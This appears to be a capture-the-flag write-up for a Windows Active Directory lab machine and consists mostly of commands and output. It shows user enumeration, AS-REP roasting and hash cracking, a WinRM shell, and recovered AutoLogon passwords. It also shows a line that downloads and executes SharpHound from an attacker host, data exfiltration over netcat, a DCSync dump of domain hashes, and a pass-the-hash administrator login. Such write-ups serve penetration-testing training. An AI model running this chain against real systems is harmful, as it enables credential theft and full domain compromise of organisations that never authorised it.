### Nmap
```text
PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain?       syn-ack
80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0
| http-methods: 
|_  Supported Methods: OPTIONS
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2022-11-07 12:04:15Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack
3269/tcp  open  tcpwrapped    syn-ack
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods: 
|_  Supported Methods: HEAD
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49673/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         syn-ack Microsoft Windows RPC
49675/tcp open  msrpc         syn-ack Microsoft Windows RPC
49698/tcp open  msrpc         syn-ack Microsoft Windows RPC

```

### Kerbrute and ASREPRoasting
```bash
# enum users within the domain
/opt/kerbrute/kerbrute userenum --dc $IP -d egotistical-bank.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 11/07/22 - Ronnie Flathers @ropnop

2022/11/07 16:31:30 >  Using KDC(s):
2022/11/07 16:31:30 >   10.10.10.175:88

2022/11/07 16:31:34 >  [+] VALID USERNAME:       administrator@egotistical-bank.local
2022/11/07 16:32:02 >  [+] VALID USERNAME:       hsmith@egotistical-bank.local
2022/11/07 16:32:06 >  [+] VALID USERNAME:       Administrator@egotistical-bank.local
2022/11/07 16:32:22 >  [+] fsmith has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$fsmith@EGOTISTICAL-BANK.LOCAL:3d7dd7f2e311e31d93fa0b7d9f835734$9ccc047d1f3d1067c59650168e5a1d3eeeca6c31101ccc3fc31ce494958b4d0c8065e9923252de678a5a35022575d2c69a2d6e6b30fb7ace57088d5ac7644a06e7801f559dd1775a0ef3d2c363162dbeeb487bf2c46db7a63300336491129c3220a34941816cd5634376ec609f60297ed3e35045243c8396db7f2a64d67a35c65b85d534c8b458c9a59d0d3fb680004b091beae2f0f143967be4b7180f70c53958136dd791f63c7de275a1c0861399168bc9c7b177b95137f5cd028ae7f7d0aa39942483830b63522b8d0059065529c953e4aa51874d395a57870ce1bb9c191511f02d127ec5f59b12cbcbb5bd68c10cdcb4679b5f31b9c639a5d172ad68c745a146ba07c321a2c5d62fc1ba8af99547896555691480                                                                                                                       
2022/11/07 16:32:22 >  [+] VALID USERNAME:       fsmith@egotistical-bank.local
...

# crack password
hashcat -m 18200 -a 0 --force fsmith.hash /usr/share/wordlists/rockyou.txt --show
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:37acb74aa7f92017ab3c818c1af3e1c6$250ffe219da288944cde7872d1be8ac0c18749ff9f2fc3a1e9bec509c78735a59c2cdcfb17f06be72454c5758f7869b1ee2e7b3d66eae3452bbbd1488a094817d70bf016f1e471f6f53570dae8b4365706d83875fbd0628c85ffdce272c6d1df537d255b2e872dc8b0653bd48de5031ebe95162021b36c2390d00ef42650637079b81b0ec735ddad975219caaea9ed4d87382a8573f491c556280d5a91c0a51d13d5b78433653f62e87865f1548855d24a8a79366af1552d736753f24d6d6520d8aced5a4f1d09418803e73ce39451a8c7418dec9e2fc899f4253872c780c3b57894dfd6e6e2ac4567bb73525544af8e8089f0124aaadd4ecf528fae24965c3d:Thestrokes23

# get shell
evil-winrm -i $IP -u fsmith -p Thestrokes23
```

### Priv Esc
```bash
# enum users
Administrator            FSmith                   Guest
HSmith                   krbtgt                   svc_loanmgr

# Some AutoLogon credentials were found
DefaultDomainName             :  EGOTISTICALBANK
DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
DefaultPassword               :  Moneymakestheworldgoround!

# login svc-loanmgr
evil-winrm -i $IP -u svc_loanmgr -p Moneymakestheworldgoround!

# collect domain data
IEX (New-Object Net.WebClient).Downloadstring('http://10.10.14.10/SharpHound.ps1'); Invoke-BloodHound -CollectAll

# send back data through netcat
`kali> nc -lp 12345 > svc_loanmgr_BloodHound.zip`
cmd.exe /C ".\nc.exe 10.10.14.10 12345 < 20221108232926_BloodHound.zip"

# bloodhound enum
OUTBOUND OBJECT CONTROL

# DCSync attack
impacket-secretsdump "egotistical-bank.local/svc_loanmgr:Moneymakestheworldgoround\!@$IP" -outputfile domain_hashes 

# get admin shell
evil-winrm -i $IP -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e

```
